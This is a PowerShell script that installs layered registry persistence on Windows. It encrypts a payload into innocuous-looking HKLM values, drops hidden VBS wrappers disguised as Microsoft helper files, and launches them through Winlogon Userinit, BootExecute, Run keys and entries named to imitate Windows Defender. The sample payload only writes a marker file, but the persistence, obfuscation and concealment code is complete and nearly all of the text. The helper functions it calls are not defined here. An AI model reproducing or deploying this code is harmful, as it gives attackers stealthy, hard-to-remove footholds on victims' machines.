$plainPayload = "Set-Content -Path 'C:\Users\Public\Documents\pwned.txt' -Value 'Pwn3d' -Force"

Write-Host "[*] Installing HKLM persistence chains..." -ForegroundColor Cyan

# PRIMARY CHAIN - Store encrypted payload
$e1=e $plainPayload "StaticSalt1234" "S3cr3tK3y!2024#Showdown"
Set-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "DriverData" $e1

# PRIMARY CHAIN - Loader script
$l1='try{$d=[Security.Cryptography.Rfc2898DeriveBytes]::new("S3cr3tK3y!2024#Showdown",[Text.Encoding]::UTF8.GetBytes("StaticSalt1234"),10000);$k=$d.GetBytes(32);$iv=$d.GetBytes(16);$e=(gp "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" DriverData -EA 0).DriverData;if($e){$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$p=$a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($e),0,$e.Length);iex([Text.Encoding]::UTF8.GetString($p))}}catch{}'
$eL1=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($l1))

# PRIMARY CHAIN - VBS wrapper
$v=$null
foreach($x in @("$env:ProgramData\Microsoft\Installer\msihelper.vbs","$env:ProgramData\Microsoft\Windows\Caches\cache.vbs")){
try{$d=Split-Path $x;if(!(Test-Path $d)){New-Item $d -ItemType Directory -Force|Out-Null}
$c=@();for($i=0;$i -lt $eL1.Length;$i+=8){$c+=$eL1.Substring($i,[Math]::Min(8,$eL1.Length-$i))}
$vbs="On Error Resume Next`nSet sh=CreateObject(""WScript.Shell"")`nc=""powershell -window hidden -exec bypass -enc ""&""$($c -join '""&""')""`nsh.Run c,0,False"
Set-Content $x $vbs -Encoding ASCII -Force;(gi $x -Force).Attributes=6;$v=$x;break}catch{}}
$c=if($v){"wscript.exe //B //Nologo `"$v`""}else{"powershell.exe -Exec Bypass -Window Hidden -Enc $eL1"}

# HKLM Triggers
$w=(gp "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" Userinit -EA 0).Userinit
$n=if($w -and $w -notlike "*$c*"){"$w,$c"}elseif(!$w){"C:\Windows\system32\userinit.exe,$c"}else{$w}
Set-RegValue "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" "Userinit" $n
Write-Host "[PRIMARY] Winlogon\Userinit appended" -ForegroundColor Green

$b=(gp "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" BootExecute -EA 0).BootExecute
$m=if($b -and $b -notlike "*$c*"){"$b`n$c"}elseif(!$b){"autocheck autochk *`n$c"}else{$b}
Set-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" "BootExecute" $m
Write-Host "[PRIMARY] BootExecute appended" -ForegroundColor Green

Set-RegValue "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" "SystemHelper" $c
Set-RegValue "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" "OneTimeSetup" $c
Set-RegValue "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices" "ServiceHost" $c
Set-RegValue "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" "WindowsDefenderStatus" $c
Set-RegValue "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" "WindowsDefenderStatus" $c
Write-Host "[PRIMARY] HKLM triggers installed" -ForegroundColor Green

# BACKUP CHAIN - Store encrypted payload
$e2=e $plainPayload "DifferentSalt5678" "BackupKey!2024#DifferentPassword"
Set-RegValue "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" "CompatData" $e2
Write-Host "[BACKUP] Blob stored in AppCompatFlags\Custom" -ForegroundColor Green

# BACKUP CHAIN - Loader script
$l2='try{$d=[Security.Cryptography.Rfc2898DeriveBytes]::new("BackupKey!2024#DifferentPassword",[Text.Encoding]::UTF8.GetBytes("DifferentSalt5678"),10000);$k=$d.GetBytes(32);$iv=$d.GetBytes(16);$e=(gp "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom" CompatData -EA 0).CompatData;if($e){$a=[Security.Cryptography.Aes]::Create();$a.Key=$k;$a.IV=$iv;$p=$a.CreateDecryptor().TransformFinalBlock([Convert]::FromBase64String($e),0,$e.Length);iex([Text.Encoding]::UTF8.GetString($p))}}catch{}'
$eL2=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($l2))

# BACKUP CHAIN - VBS wrapper
$bvp="$env:ProgramData\Microsoft\Internet Explorer\UserData\iehelper.vbs"
$d=Split-Path $bvp;if(!(Test-Path $d)){New-Item $d -ItemType Directory -Force|Out-Null}
$c2=@();for($i=0;$i -lt $eL2.Length;$i+=8){$c2+=$eL2.Substring($i,[Math]::Min(8,$eL2.Length-$i))}
$v2="On Error Resume Next`nSet sh=CreateObject(""WScript.Shell"")`nc=""powershell -window hidden -exec bypass -enc ""&""$($c2 -join '""&""')""`nsh.Run c,0,False"
Set-Content $bvp $v2 -Encoding ASCII -Force;(gi $bvp -Force).Attributes=6
$c2e="wscript.exe //B //Nologo `"$bvp`""
Write-Host "[BACKUP] VBS wrapper: $bvp" -ForegroundColor Green

# BACKUP CHAIN - Triggers
Set-RegValue "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" "Startup" $c2e
Set-RegValue "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd" "StartupPrograms" $c2e
Write-Host "[BACKUP] HKLM backup triggers installed" -ForegroundColor Green

Write-Host "[+] HKLM persistence completed" -ForegroundColor Green
